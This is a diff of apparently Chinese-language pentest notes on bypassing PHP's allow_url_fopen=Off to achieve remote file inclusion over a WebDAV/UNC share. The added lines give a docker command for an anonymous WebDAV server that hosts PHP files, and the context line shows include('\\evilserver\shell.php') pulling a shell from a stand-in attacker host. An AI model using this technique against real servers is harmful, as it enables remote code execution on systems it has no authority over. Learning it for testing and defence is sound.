@@ -62,6 +62,19 @@ emmmm前面三个在win10下无效
 
 ### \\\\绕过allow_url_fopen=Off,来rfi
 
+ https://xz.aliyun.com/t/5535#toc-2 （搭建方法）
+
+```
+借用P神的方法快速搭建webdav服务器
+
+一键启动一个webdav服务器
+
+docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav
+然后把php文件放到/root/webdav/data里就行了
+```
+
+
+
 ` include ('\\evilserver\shell.php'); `
 
 这里貌似无法设置端口号
